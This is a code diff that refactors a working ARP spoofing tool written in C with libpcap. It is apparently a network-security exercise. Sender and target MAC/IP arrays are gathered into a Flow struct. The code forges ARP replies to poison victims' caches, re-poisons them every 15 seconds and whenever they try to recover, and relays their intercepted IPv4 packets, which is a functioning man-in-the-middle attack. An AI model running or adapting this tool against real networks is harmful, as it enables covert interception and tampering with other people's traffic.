@@ -12,13 +12,17 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
+typedef struct {
+		Mac sender_mac;
+		Mac target_mac;
+		Ip sender_ip;
+		Ip target_ip;
+}Flow;
+
 struct Args {
 	pcap_t* handle;
 	EthArpPacket *packet;
-	Mac *sm;
-	Ip *si;
-	Mac *tm;
-	Ip *ti; 
+	Flow *flow;
 	Mac mm; 
 	int cnt;
 };
@@ -95,28 +99,29 @@ void get_mac_addr(pcap_t* handle, EthArpPacket *packet, Mac *sm, Ip si, Mac mm, 
 	wait_packet(handle, sm, NULL_MAC , si, mm, mi);
 }
 
-int arp_cache_poisoning(pcap_t* handle, EthArpPacket *packet, Mac sm, Ip si, Mac tm, Ip ti, Mac mm) {
-	make_packet(packet, sm, mm, mm, ti, sm, si, 0);
+int arp_cache_poisoning(pcap_t* handle, EthArpPacket *packet, Flow *flow, Mac mm) {
+	make_packet(packet, flow->sender_mac, mm, mm, flow->target_ip, flow->sender_mac, flow->sender_ip, 0);
 	return send_packet(handle, packet, sizeof(EthArpPacket));
 }
 
 
-int check_arp_recover(pcap_t* handle, EthArpPacket *packet , Mac *sm, Ip *si, Mac *tm, Ip *ti, Mac mm, int cnt) {
+int check_arp_recover(pcap_t* handle, EthArpPacket *packet , Flow *flow, Mac mm, int cnt) {
 	for(int i=0; i<=cnt; i++) {
-		if((ntohl(packet->arp_.tip_) == si[i]) && (ntohl(packet->arp_.tip_) == ti[i]) || (ntohl(packet->arp_.tip_) == ti[i]) && (ntohl(packet->arp_.tip_) == si[i])) {
+		if((ntohl(packet->arp_.tip_) == flow[i].sender_ip) && (ntohl(packet->arp_.tip_) == flow[i].target_ip) || (ntohl(packet->arp_.tip_) == flow[i].target_ip) && (ntohl(packet->arp_.tip_) == flow[i].sender_ip)) {
+			
 			for(int j=0; j<5; j++) {
-				if(!(arp_cache_poisoning(handle, packet, sm[i], si[i], tm[i], ti[i], mm))) return 0;
+				if(!(arp_cache_poisoning(handle, packet, &(flow[i]), mm))) return 0;
 			}
 		}
 	}
 	return 1;
 }
 
-int relay_packet(pcap_t* handle, pcap_pkthdr* header, EthArpPacket *packet , Mac *sm, Ip *si, Mac *tm, Ip *ti, Mac mm, Ip mi, int cnt) {	
+int relay_packet(pcap_t* handle, pcap_pkthdr* header, EthArpPacket *packet , Flow *flow, Mac mm, Ip mi, int cnt) {	
 	for(int i=0; i<=cnt; i++) {
 		ip_header *IpHdr =  (ip_header *)((uint8_t *)packet + sizeof(EthHdr));
-		if(((ntohl(IpHdr->src_Addr) == si[i]) && (ntohl(IpHdr->dst_Addr) != mi)) || ((ntohl(IpHdr->src_Addr) != si[i]) && (ntohl(IpHdr->dst_Addr) == ti[i]))) {
-			packet->eth_.dmac_ = tm[i];
+		if(((ntohl(IpHdr->src_Addr) == flow[i].sender_ip) && (ntohl(IpHdr->dst_Addr) != mi)) || ((ntohl(IpHdr->src_Addr) != flow[i].sender_ip) && (ntohl(IpHdr->dst_Addr) == flow[i].target_ip))) {
+			packet->eth_.dmac_ = flow[i].target_mac;
 			packet->eth_.smac_ = mm;
 		}
 		else continue;
@@ -125,7 +130,7 @@ int relay_packet(pcap_t* handle, pcap_pkthdr* header, EthArpPacket *packet , Mac
 	return 1;
 }
 
-int arp_spoofing(pcap_t* handle, Mac *sm, Ip *si, Mac *tm, Ip *ti, Mac mm, Ip mi, int cnt) {
+int arp_spoofing(pcap_t* handle, Flow *flow, Mac mm, Ip mi, int cnt) {
 	struct pcap_pkthdr* header;
 	const u_char* pkt;
 	while(1) {
@@ -137,10 +142,10 @@ int arp_spoofing(pcap_t* handle, Mac *sm, Ip *si, Mac *tm, Ip *ti, Mac mm, Ip mi
 		}
 		EthArpPacket* packet = (EthArpPacket*)pkt;
 		if(ntohs(packet->eth_.type_) == EthHdr::Arp) {
-			return check_arp_recover(handle, packet, sm, si, tm, ti, mm, cnt);
+			return check_arp_recover(handle, packet, flow, mm, cnt);
 		}
 		else if(packet->eth_.dmac_ == mm && (ntohs(packet->eth_.type_) == EthHdr::Ip4)){
-			return relay_packet(handle, header, packet, sm, si, tm, ti, mm, mi, cnt);
+			return relay_packet(handle, header, packet, flow, mm, mi, cnt);
 		}
 	}
 }
@@ -148,7 +153,7 @@ int arp_spoofing(pcap_t* handle, Mac *sm, Ip *si, Mac *tm, Ip *ti, Mac mm, Ip mi
 void *send_arp_with_interval(void * p) {
 	Args *args = (Args *)p;
 	while(1) {
-		for(int i=0; i<=args->cnt; i++) arp_cache_poisoning(args->handle, args->packet, args->sm[i], args->si[i], args->tm[i], args->ti[i], args->mm);
+		for(int i=0; i<=args->cnt; i++) arp_cache_poisoning(args->handle, args->packet, &(args->flow[i]), args->mm);
 		sleep(15);
 	}
 }
@@ -222,12 +227,10 @@ int main(int argc, char* argv[]) {
 	EthArpPacket packet;
 	
 	Mac *NULL_MAC;
-	Mac sender_mac[1000];
-	Mac target_mac[1000];
 	Mac my_mac;
-	Ip sender_ip[1000];
-	Ip target_ip[1000];
 	Ip my_ip;
+	
+	Flow flow[1000];
 	
 	int cnt;
 	
@@ -236,24 +239,25 @@ int main(int argc, char* argv[]) {
 		
 	for(int i=2; i<argc; i+=2) {
 		cnt = (i-2) / 2;
-		sender_ip[cnt] = Ip((argv[i]));
-		target_ip[cnt] = Ip((argv[i + 1]));
 		
-		printf("\nSENDER IP : %s\tTARGET IP : %s\n", std::string(sender_ip[cnt]).c_str(), std::string(target_ip[cnt]).c_str());
+		flow[cnt].sender_ip = Ip((argv[i]));
+		flow[cnt].target_ip = Ip((argv[i + 1]));
 		
-		get_mac_addr(handle, &packet, sender_mac + cnt, sender_ip[cnt], my_mac, my_ip);
-		get_mac_addr(handle, &packet, target_mac + cnt, target_ip[cnt], my_mac, my_ip);
-		arp_cache_poisoning(handle, &packet, sender_mac[cnt], sender_ip[cnt], target_mac[cnt], target_ip[cnt], my_mac);
+		printf("\nSENDER IP : %s\tTARGET IP : %s\n", std::string(flow[cnt].sender_ip).c_str(), std::string(flow[cnt].target_ip).c_str());
+		
+		get_mac_addr(handle, &packet, &(flow[cnt].sender_mac), flow[cnt].sender_ip, my_mac, my_ip);
+		get_mac_addr(handle, &packet, &(flow[cnt].target_mac), flow[cnt].target_ip, my_mac, my_ip);
+		arp_cache_poisoning(handle, &packet, &(flow[cnt]), my_mac);
 		
 		printf("ARP CACHE POISONING COMPLETE\n");
 		
 	}
 	pthread_t thread;
-	Args args = {handle, &packet, sender_mac, sender_ip, target_mac, target_ip, my_mac, cnt};
+	Args args = {handle, &packet, flow, my_mac, cnt};
 	if(!(pthread_create(&thread, NULL, send_arp_with_interval, (void *)(&args)))) {
 		printf("\nARP SPOOFING IS ACTIVATED ...\n");
 		while(1) {
-			if(arp_spoofing(handle, sender_mac, sender_ip, target_mac, target_ip, my_mac, my_ip, cnt)) continue;
+			if(arp_spoofing(handle, flow, my_mac, my_ip, cnt)) continue;
 			printf("ERROR OCCURED\n");
 			break;
 		}
